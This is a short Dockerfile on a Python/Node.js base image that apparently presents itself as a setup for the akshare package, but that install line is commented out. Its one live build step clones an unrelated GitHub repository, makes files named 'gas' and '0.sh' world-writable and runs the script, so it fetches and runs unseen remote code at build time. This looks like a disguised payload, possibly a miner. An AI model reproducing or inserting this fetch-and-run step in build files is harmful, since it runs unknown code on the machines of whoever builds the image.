FROM nikolaik/python-nodejs:python3.8-nodejs16

MAINTAINER Albert King <jindaixang@163.com>

# RUN pip install akshare -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host=mirrors.aliyun.com  --upgrade
RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
